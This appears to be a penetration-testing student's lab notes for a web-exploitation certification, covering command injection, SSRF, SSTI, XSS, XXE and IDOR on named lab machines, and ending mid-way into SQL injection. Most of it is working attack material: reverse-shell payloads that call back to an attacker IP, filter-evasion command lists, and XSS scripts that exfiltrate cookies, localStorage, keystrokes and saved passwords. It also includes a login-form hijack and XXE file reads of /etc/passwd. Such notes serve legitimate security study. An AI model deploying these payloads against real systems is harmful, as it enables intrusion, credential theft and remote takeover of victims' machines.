work                    [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 47ms]
The                     [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 50ms]
our                     [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 50ms]
with                    [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 51ms]
and                     [Status: 200, Size: 4835, Words: 640, Lines: 133, Duration: 50ms]
ANGELES                 [Status: 200, Size: 4892, Words: 638, Lines: 133, Duration: 48ms]
```
can see the outlier
![[Pasted image 20241110021818.png]]
login as sam
![[Pasted image 20241110022438.png]]

--------
##### Local Code Execution (LCE)
###### Bambi
![[Pasted image 20241203171551.png]]

---------
##### Remote Code Execution (RCE)
- **Common Protections are required for RCE occasionally***
###### Bubo
#curl
First test to see if able to hit `kali` machine - typically with a curl command
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 100
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=`curl http://192.168.45.171:8000/test.txt`
```
python3 server `test.txt` hit, shows we have rce
![[Pasted image 20241205130619.png]]
submit `payload` with `URL` encoding `CTRL+U`
```bash
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 88
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=`nc+-c+sh+192.168.45.171+1337`
```
catch `revshell` & profit
![[Pasted image 20241205135720.png]]

###### Payloads for Common Protections
###### Basic Variants
```bash
$(wget http://192.168.45.171:8000/test.txt)
$(curl -X GET http://192.168.45.171:8000/test.txt)
$(lynx -source http://192.168.45.171:8000/test.txt)
```
###### Obfuscated Variants
```bash
$(`cu\rl` http://192.168.45.171:8000/test.txt)
$(cu$'r'l http://192.168.45.171:8000/test.txt)
$(echo curl | sh -s http://192.168.45.171:8000/test.txt)
```
###### Encoded/Decoded Variants
```bash
$(curl http://192.168.45.171:8000/test.txt | base64)
$(base64 -d <<< Y3VybCBodHRwOi8vMTkyLjE2OC40NS4xNzE6ODAwMC90ZXN0LnR4dA== | sh)
```
###### Command Substitution Alternatives
```bash
`curl http://192.168.45.171:8000/test.txt`
$(eval curl http://192.168.45.171:8000/test.txt)
```
###### Using Other Utilities
```bash
$(python -c 'import os; os.system("curl http://192.168.45.171:8000/test.txt")')
$(perl -e 'system("curl http://192.168.45.171:8000/test.txt")')
$(php -r 'file_get_contents("http://192.168.45.171:8000/test.txt");')
```
###### RCE Advanced Techniques
###### Whitespace Evasion
```bash
$(curl${IFS}http://192.168.45.171:8000/test.txt)
$(curl$IFS"http://192.168.45.171:8000/test.txt")
```
###### URL Encoding
```bash
$(curl%20http://192.168.45.171:8000/test.txt)
$(curl%09http://192.168.45.171:8000/test.txt)
```
###### Chained Commands
```bash
$(curl http://192.168.45.171:8000/test.txt; echo Done)
$(curl http://192.168.45.171:8000/test.txt && touch /tmp/test)
```
###### Reverse Shell Payloads
```bash
$(curl http://192.168.45.171:8000/test.sh | sh)
$(wget http://192.168.45.171:8000/test.sh -O- | sh)
```
###### Testing Against Filters
###### Custom Headers
```bash
curl -H "X-Test: payload" http://192.168.45.171:8000/test.txt
```
###### Dynamic Execution
```bash
$(eval $(echo curl) http://192.168.45.171:8000/test.txt)
```

----




##### Insecure Direct Object Reference (IDOR)
###### Bubo
#idor
###### Burpsuite Sniper Method
click on a test file in the `file repository`
![[Pasted image 20241205093820.png]]
send to `intruder`
![[Pasted image 20241205094007.png]]
in `intruder` add the `$$` to determine which field to test
![[Pasted image 20241205094740.png]]
under `Payloads` add the wordlist `/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt`
![[Pasted image 20241205094846.png]]
start `SNIPER` attack and identify all the `.txt` files that exist 
![[Pasted image 20241205095116.png]]

###### Fuzzing method
#ffuf
`ffuf` to identify pdf's
```bash
┌──(root💀gobots)-[11Nov2024 20:37:25]-[/home/kali]
└─# ffuf -w /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt -u "http://bubo/scientific/repository/data/FUZZ" -e .txt,.pdf

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bubo/scientific/repository/data/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/5-digits-00000-99999.txt
 :: Extensions       : .txt .pdf 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

11211.txt               [Status: 200, Size: 893, Words: 136, Lines: 21, Duration: 28ms]
11345.pdf               [Status: 200, Size: 67359, Words: 806, Lines: 524, Duration: 28ms]
13262.txt               [Status: 200, Size: 698, Words: 105, Lines: 15, Duration: 28ms]
14121.txt               [Status: 200, Size: 1187, Words: 183, Lines: 25, Duration: 27ms]
21925.pdf               [Status: 200, Size: 52794, Words: 597, Lines: 406, Duration: 28ms]
26711.txt               [Status: 200, Size: 1356, Words: 208, Lines: 31, Duration: 28ms]
31512.txt               [Status: 200, Size: 336, Words: 30, Lines: 18, Duration: 143ms]
42123.txt               [Status: 200, Size: 850, Words: 135, Lines: 20, Duration: 29ms]
74821.txt               [Status: 200, Size: 1499, Words: 227, Lines: 33, Duration: 71ms]
82911.txt               [Status: 200, Size: 1308, Words: 169, Lines: 42, Duration: 28ms]
:: Progress: [300000/300000] :: Job [1/1] :: 1351 req/sec :: Duration: [0:04:12] :: Errors: 0 ::
```

##### Command Injection
###### Bubo
#commandinjectionlinux
we then begin testing to see if `Command injection` is a vector, however utilizing a basic payload didnt work.
```bash
curl http://192.168.45.222:8000/test.txt
```
submitted in the password field
![[Pasted image 20241111195645.png]]
`200` error but nothing happened in my `python3` listener
![[Pasted image 20241111195718.png]]
going down the list below of [[11.2 - 11.2.4 Dealing with Common Protections]] weend up getting the `$` one to work.
`$(curl http://192.168.45.222:8000/test.txt)`
```bash
||curl http://192.168.45.222:8000/test.txt
;curl http://192.168.45.222:8000/test.txt
|curl http://192.168.45.222:8000/test.txt
&&curl http://192.168.45.222:8000/test.txt
`curl http://192.168.45.222:8000/test.txt`
$(curl http://192.168.45.222:8000/test.txt)
```
So the `Common Protections` worked
![[Pasted image 20241111195849.png]]
now since we know we are able to get `Blind Command Injection` lets try to get a reverse shell.


revshell creation:
```bash
┌──(root💀gobots)-[11Nov2024 22:17:11]-[/home/kali/SUT/OSWA]
└─# cat revshell        
bash -i >& /dev/tcp/192.168.45.222/4444 0>&1

```
utilizing the vulnerable parameter to upload `revshell` - make sure to `CTRL+U` to encode 
```bash
$(curl -o /tmp/revshell http://192.168.45.222:8000/revshell)
```
full payload with URL encoding:
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 132
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=%24%28curl+-o+%2Ftmp%2Frevshell+http%3A%2F%2F192.168.45.222%3A8000%2Frevshell%29
```
![[Pasted image 20241111200257.png]]
showing that the `revshell` was succesfully pulled over 
![[Pasted image 20241111201330.png]]
changing permissions to `executable`
```bash
$(chmod +x /tmp/revshell)
```
full payload with URL encoding:
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 89
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=%24%28chmod+%2Bx+%2Ftmp%2Frevshell%29
```
![[Pasted image 20241111201254.png]]
setting up a `nc` listener to catch a reverse shell
![[Pasted image 20241111201508.png]]
executing reverse shell
```bash
$(/bin/bash /tmp/revshell)
```
Full encoded payload:
```http
POST /personnelSubmission/index.php HTTP/1.1
Host: bubo
Content-Length: 92
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://bubo
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bubo/personnelSubmission/index.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

submissionData=Data+goes+here.&passCheck=on&zipPass=%24%28%2Fbin%2Fbash+%2Ftmp%2Frevshell%29
```
![[Pasted image 20241111201611.png]]
proof
`e83e084c2bcb87c9b64480858edd7f75`
![[Pasted image 20241111201727.png]]
###### Solarmedical
#commandinjectionwindows 
tried utilizing this payload
```bash
c:\test"&dir C:\proof.txt
```
was able to identify `proof.txt`
![[Pasted image 20241218143356.png]]
navigate to `http://solarmedical/dashboard` and back to `http://solarmedical/backup` to refresh it
```bash
c:\backup"&type c:\proof.txt
```
proof.txt `44d9b5daadd2d574a9aa2220c2f903ae`
##### Server Side Request Forgery (SSRF)

######  Glaucidium 
###### SSRF Testing
right under the `Welcome Test!` are fields that are able to be `edited` or `updated`
![[Pasted image 20241208013435.png]]
`Advanced Information` reveals places to upload files, this is a sign of `SSRF`
![[Pasted image 20241208013459.png]]
testing the `Website Field` with `http://192.168.45.231:8000/test` yields no results to my `python3` server
![[Pasted image 20241208013825.png]]
only updates the profile
![[Pasted image 20241208013932.png]]
the `Update CD or RESUME Method` includes 2 options - `upload file` and `upload from URL`
![[Pasted image 20241208014032.png]]
testing the `upload from URL` with this payload `http://192.168.45.231:8000/test` diplays an error
![[Pasted image 20241208014151.png]]
and yields results on our `python3` server
![[Pasted image 20241208014212.png]]

###### SSRF Exploitation
when filtering by `/api` in `burpsuite` we can identify the `POST` request that created our user `test@test.local` - now because of this endpoint `/api/user/create` we are expected to assume `/api/admin/create` exists as well.
![[Pasted image 20241208021628.png]]
if we send the `/api/user/create` to repeater and change it to `/api/admin/create` we can see that it exists and we have to be authenticated to interact with it.
![[Pasted image 20241208021819.png]]
luckily we already proved that `SSRF` is a vector above with the `http://192.168.45.231:8000/test`

so to exploit this we are going to `utilize` a tool called `SSRF2gopher` which is utilized to interact with `API` endpoints
![[Pasted image 20241208022055.png]]
Throwing the last payload into the vulnerable `SSRF` field creates the `admintest` user
```bash
___________  _______                 __          
  / __/ __/ _ \/ __/_  |___ ____  ___  / /  ___ ____
 _\ \_\ \/ , _/ _// __// _ `/ _ \/ _ \/ _ \/ -_) __/
/___/___/_/|_/_/ /____/\_, /\___/ .__/_//_/\__/_/   
                      /___/    /_/                  

Created by eMVee 
    
[?] What is the address of the Host? 
127.0.0.1
[?] What port should be used for gopher? 
80
[?] What endpoint should be used for gopher? 
/api/admin/create
[?] What data would you like to post? 
username=admintest&password=admintest

[!] Plain text payload:


gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

username=admintest&password=admintest

[!] URL encoded payload:
gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0aHost:%20127.0.0.1%0aContent-Type:%20application/x-www-form-urlencoded%0aContent-Length:%2037%0a%0ausername%3dadmintest%26password%3dadmintest

[!] Double URL encoded payload:
gopher%3a//127.0.0.1%3a80/_POST%2520/api/admin/create%2520HTTP/1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application/x-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

[!] Another option that might work via something like BURP:
gopher%3a%2F%2F127.0.0.1%3a80%2F_POST%2520%2Fapi%2Fadmin%2Fcreate%2520HTTP%2F1.1%250aHost%3a%2520127.0.0.1%250aContent-Type%3a%2520application%2Fx-www-form-urlencoded%250aContent-Length%3a%252037%250a%250ausername%3dadmintest%26password%3dadmintest

```
we can see that the account was created
![[Pasted image 20241208022227.png]]now at the `http://glaucidium/public/admin/login` endpoint try to login with `admintest:admintest`
![[Pasted image 20241208022400.png]]
and `local.txt`
![[Pasted image 20241208022417.png]]

##### Server Side Template Injection (SSTI)

###### Glaucidium 
Upon clicking `Admin Dashboard` this leads us to `Create a  New Article`
![[Pasted image 20241208022740.png]]
this brings us to this field - where `mako` is being utilized for `templating`
![[Pasted image 20241208022820.png]]
a simple google search shows us that `mako` utilizes python
![[Pasted image 20241208022911.png]]
utilizing `hacktricks mako` gives us a payload to test for `SSTI`
![[Pasted image 20241208023108.png]]
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
this is what it looks like utilizing the `payload` - and hitting update
![[Pasted image 20241208023145.png]]
after hitting update lets navigate to the view of a generic `user` viewing the news page
![[Pasted image 20241208023246.png]]
this proves that it is utilizing `python` and we can try to utilize `revshells` to generate a simple `python shell` utilizing the `mako` formatting 
![[Pasted image 20241208025132.png]]
the payload used that gives a semi stable reverse shell
-  putting code in between `<%` and `%>` which is the required format for `mako`
```python
<%
import os,pty,socket;s=socket.socket();s.connect(("192.168.45.231",1337));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
%>
${x}
```
submitting payload and ensuring to hit `update`
![[Pasted image 20241208025306.png]]
once the payload is in place - make sure to setup `nc` listener and brose to the `news` page that this would be displayed on - it doesnt load because its kicking off the `revshell`
![[Pasted image 20241208025413.png]]
flag
![[Pasted image 20241208025446.png]]


##### Cross Site Scripting (XSS) - All Payloads

###### Starting payloads
```html
<h1>offsec</h1> - used for initial HTML injection
```

```js
<script>alert(0)</script> - used to display alerts
<img src='x' onerror='alert(1)'> - used to bypass innerHTML (found in network packets) and allow scripts
```
###### Payload 1 - `ALERT` testing
```bash
┌──(root💀gobots)-[31Jul2024 20:23:23]-[/home/kali/SUT]
└─# mkdir xss

┌──(root💀gobots)-[31Jul2024 20:23:25]-[/home/kali/SUT]
└─# cd xss
echo "alert(1)" > xss.js

python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Now that the server is started, let's use the payload to exploit the search application with the script below:
```js
<script src="http://192.168.45.222:8000/xss.js"></script>
```
-------
###### Payload 2 - `STEALING COOKIES`
```bash
┌──(root💀gobots)-[31Jul2024 20:53:19]-[/home/kali/SUT/OSWA/xss]
└─# vim xss2.js     

┌──(root💀gobots)-[31Jul2024 20:53:43]-[/home/kali/SUT/OSWA/xss]
└─# cat xss2.js                  
let cookie = document.cookie

let encodedCookie = encodeURIComponent(cookie)

fetch("http://192.168.45.223/exfil?data=" + encodedCookie)


# set up python server
kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
-------------------------
###### Payload 3 - `STEALING LOCAL SECRETS`
```bash
┌──(root💀gobots)-[02Aug2024 13:15:17]-[/home/kali/SUT/OSWA/xss]
└─# vim xss3.js   

┌──(root💀gobots)-[02Aug2024 13:15:49]-[/home/kali/SUT/OSWA/xss]
└─# cat xss3.js   
let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.45.223/exfil?data=" + encodedData)

┌──(root💀gobots)-[02Aug2024 13:15:57]-[/home/kali/SUT/OSWA/xss]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Payload to test against own kali machine 1st
```bash
<script src="http://192.168.45.223:80/xss3.js"></script>
```
------------
###### Payload 4 - `KEYLOGGING`
```bash
┌──(root💀gobots)-[05Aug2024 19:14:45]-[/home/kali/SUT/OSWA/xss]
└─# vim xss4.js

# Make sure to change the IP address
┌──(root💀gobots)-[05Aug2024 19:15:09]-[/home/kali/SUT/OSWA/xss]
└─# cat xss4.js 
function logKey(event){
        fetch("http://192.168.45.236/k?key=" + event.key)
}

document.addEventListener('keydown', logKey);

┌──(root💀gobots)-[05Aug2024 19:15:50]-[/home/kali/SUT/OSWA/xss]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
In the search option on the website drop the payload and hit search
payload
```bash
<script src="http://192.168.45.236:80/xss4.js"></script>
```
---------
###### Payload 5 - `STEALING SAVED PASSWORDS`
```bASH
┌──(root💀gobots)-[05Aug2024 20:48:35]-[/home/kali/SUT/OSWA/xss]
└─# vim xss5.js

┌──(root💀gobots)-[05Aug2024 20:48:46]-[/home/kali/SUT/OSWA/xss]
└─# cat xss5.js 
let body = document.getElementsByTagName("body")[0];

var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
//u.style.opacity = "0";

var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
//p.style.opacity = "0";

body.append(u)
body.append(p)

setTimeout(function(){ 
    fetch("http://192.168.45.236:80/k?u=" + u.value + "&p=" + p.value)
}, 5000);
                 
┌──(root💀gobots)-[05Aug2024 20:49:27]-[/home/kali/SUT/OSWA/xss]
└─# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Payload
```bash
<script src="http://192.168.45.236:80/xss5.js"></script>
```
---------
###### Payload 6 - `PHISHING USERS`
xss6.js
```js
fetch("login").then(res => res.text().then(data => {
	document.getElementsByTagName("html")[0].innerHTML = data
	document.getElementsByTagName("form")[0].action = "http://192.168.45.236"
	document.getElementsByTagName("form")[0].method = "get"
}))
```
Payload
```bash
<script src="http://192.168.45.236:80/xss6.js"></script>
```
###### Payload 7 - `innerHTML Bypass method`
payload to bypass `innerHTML` - `onerror` method
```bash
<img src="nonexistent.jpg" onerror="this.onerror=null;document.write('<script src=\'http://192.168.45.231:8000/pwn.js\'><\/script>');" />
```

###### Payload 8 - `jQuery Library - jQuery.getScript() function`

[[5.2 - 5.2.4 Case Study - Shopizer Reflected XSS]]
We can find the JavaScript files Shopizer uses by clicking on `http://shopizer:8080`> `resources` > `js`.
- in `OSWA` its probably safe to assume that the `jQuery.getScript()`function exists if their is `js resources`
![[Pasted image 20241223154252.png]]
The Shopizer application loads several jQuery files. The [jQuery library](https://en.wikipedia.org/wiki/JQuery) makes DOM manipulation easier in JavaScript with helper functions. One of the helper functions we're interested in is the [_jQuery.getScript()_](https://api.jquery.com/jquery.getscript/) function to load and execute a remote JavaScript file.

creating a simple `JS` file
```bash
kali@kali:~$ mkdir ~/xss/

kali@kali:~$ cd ~/xss/

kali@kali:~/xss$ nano xss.js

kali@kali:~/xss$ cat xss.js
alert('It worked!')

kali@kali:~/xss$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Next, let's craft the XSS payload that will load this file. We need to pass the `jQuery.getScript()` function a URL. We've already discovered that a semicolon causes issues with the payload, and ideally, we want to use the least amount of special characters as possible.

payload
- had to make sure `jQuery` was spelt like that
```js
jQuery.getScript('http://192.168.45.233/xsscinco.js')
```
Here, we'll find the server informing us of an "Invalid character found in the request target". This is most likely because of the value returned by the `getScript()` function. We can fix this by Base64-encoding the entire response using the `btoa()` function. We'll have to wrap the entire `eval()` in this function.

```js
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvLmpzJykK')))+'
```

Our next step is to craft a JavaScript payload to send a similar request. We'll use the `fetch()` function to send the request and pass it the URL and an object containing the various configurations necessary for the request.

without numbers `xsscinco2.js`
```js
fetch('http://shopizer:8080/shop/customer/updateAddress.html', {
  method: 'POST',
  mode: 'same-origin',
  credentials: 'same-origin',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  }, 
  body: 'customerId=&billingAddress=false&firstName=hax&lastName=hax&company=&address=hax&city=hax&country=AL&stateProvince=z&postalCode=z&phone=z&submitAddress=Change address'
});
```
We'll start the options object by setting the `method` to "POST" (line 2). Since our payload will effectively be hosted on the same domain as the application, we'll set the `mode` and `credentials` values to "same-origin" on lines 3 and 4. This should allow the browser to send the JSESSIONID cookie since the request will not be cross-origin. We'll include a `Content-Type` header with the value of "application/x-www-form-urlencoded" (lines 5-7). Finally, we'll include the POST body contents with some proof of concept values.

Now that we have our payload, we'll save it to the xss.js file we created earlier and start the HTTP server.

```bash
┌──(root💀gobots)-[23Dec2024 22:43:29]-[/home/kali/SUT/OSWA/xss]
└─# vim xsscinco2.js

kali@kali:~$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
Let's test this payload out on our own account. Let's first browse to `http://shopizer:8080/shop/customer/dashboard.html` to make sure our session is still valid. If it's not, we'll need to log in again.

Next, let's visit the "Handbags" section and load our exploit URL, which will load the malicious JavaScript file from our Kali machine. The payload again will be `'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjMzL3hzc2NpbmNvMi5qcycpCg==')))+'`

show `http server` getting a hit
![[Pasted image 20241223174632.png]]
The web page does not include any indication of whether our payload worked. If we check the HTTP history tab in Burp Suite, we should find that our POST request was sent.

We can verify the changes were saved by returning to the "My Account" page and clicking `Billing & shipping information`.

![[Pasted image 20241223174900.png]]
###### Payload 9 - `window.location.href = "http://192.168.48.6/a?b=" + btoa(document.body.innerHTML);`
- Grabs the entire pages `HTML` with `(innerHTML)`
- base64 encodes it `(btoa)`
- sends it as a query parameter `(?b=?)` to a server at `192.164.48.6`

payload.js
- make sure to add correct `http.server`port because it has to feed the data back to it
```bash
window.location.href="http://192.168.45.181:8000/a?b=" + btoa(window.document.body.innerHTML);
```
xss
```bash
<script src="http://192.168.45.181:8000/payload.js"></script>
```
##### XML External Entity (XXE)

###### Mentor - Payloads at bottom
when navigating to `Trainers` identified `export ` and `import` which typically means `XXE`
![[Pasted image 20241209173748.png]]
clicking `export` gives us an example of what the `XXE` looks like
![[Pasted image 20241209174224.png]]
now we need to find the vulnerable field
example payload to adjust for testing, the `&xxe;` is how you test for each field - when you see `/etc/passwd` that is the vulnerable field
```xml
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<entity-engine-xml>
<Product createdStamp="2021-06-04 08:15:49.363" createdTxStamp="2021-06-04 08:15:48.983" description="Giant Widget with Wheels" internalName="Giant Widget variant explosion" isVariant="N" isVirtual="Y" largeImageUrl="/images/products/WG-9943/large.png" lastUpdatedStamp="2021-06-04 08:16:18.521" lastUpdatedTxStamp="2021-06-04 08:16:18.258" primaryProductCategoryId="202" productId="XXE-0001" productName="Giant Widget with variant explosion" productTypeId="FINISHED_GOOD" productWeight="22.000000" quantityIncluded="10.000000" smallImageUrl="/images/products/WG-9943/small.png" virtualVariantMethodEnum="VV_VARIANTTREE">
<longDescription>&xxe;</longDescription>
</Product>
</entity-engine-xml>
```
used `XML FORMATTER` to properly format it
![[Pasted image 20241209174458.png]]
now we have something to work with
```xml
<?xml version="1.0"?>
<response>
	<id>1</id>
	<name>Robin Marjan</name>
	<proffesion>Web Development</proffesion>
	<bio>Robin is a web developer, mentor, and professor who is prominent in his field. He has been working in the industry for over 20 years and has seen it all. He is passionate about mentoring young developers and helping them learn the ropes. When he is not teaching or coding, he enjoys spending time with her family and friends.</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
payload to work with:
`testing.xml` - this tests all fields
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
	<id>1</id>
	<name>&xxe;</name>
	<proffesion>&xxe;</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
created on kali to `import`
![[Pasted image 20241209174932.png]]
now we have a baseline of all showing `Vulnerable to XXE` we can go further to see if we can grab machine information
![[Pasted image 20241209175048.png]]
`testing2_etcpasswd.xml`
testing to see what field spits back out `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
	<id>1</id>
	<name>&xxe;</name>
	<proffesion>&xxe;</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
this crashed the entire website, and reverted,- lets test one field at a time 
`testing3_etcpasswd.xml`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
	<id>1</id>
	<name>hahaha</name>
	<proffesion>hahaha</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
we are able to grab `/etc/passwd`
![[Pasted image 20241209175551.png]]
now lets try to grab the `proof.txt` from root

`testing4_proof.xml`
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///proof.txt">
]>
<response>
	<id>1</id>
	<name>hahaha</name>
	<proffesion>hahaha</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```

![[Pasted image 20241209175829.png]]
###### Payload 1- Vulnerable to XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe "Vulnerable to XXE">
]>
<response>
  <id>1</id>
  <name>&xxe;</name>
  <proffesion>&xxe;</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
###### Payload 2 - /etc/passwd
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
  <id>1</id>
  <name>ligma</name>
  <proffesion>nutsack</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
###### Payload 3- Proof.txt
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY xxe SYSTEM "file:///proof.txt">
]>
<response>
	<id>1</id>
	<name>hahaha</name>
	<proffesion>hahaha</proffesion>
	<bio>&xxe;</bio>
	<imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```
###### Payload - Out of band 
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://<our ip address>/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```


##### SQL Injection

######  Piano Protocol SQLmap
![[Pasted image 20241209214008.png]]
on the login page testing the default payload `' OR 1=1 --` in the `username` & `password` fields redirect to `/auth` and show that it is `MYSQL`
![[Pasted image 20241209222255.png]]
login parameters for registration
![[Pasted image 20241209214705.png]]
user created - a `/auth` popped up before the login screen - `dtype` popped up again
![[Pasted image 20241209214826.png]]
save the `post request` to begin `SQL` testing
```http
POST /auth HTTP/1.1
Host: piano
Content-Length: 794
Cache-Control: max-age=0
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
Origin: http://piano
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTRUOcxXGzadrReMb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://piano/register
Accept-Encoding: gzip, deflate, br
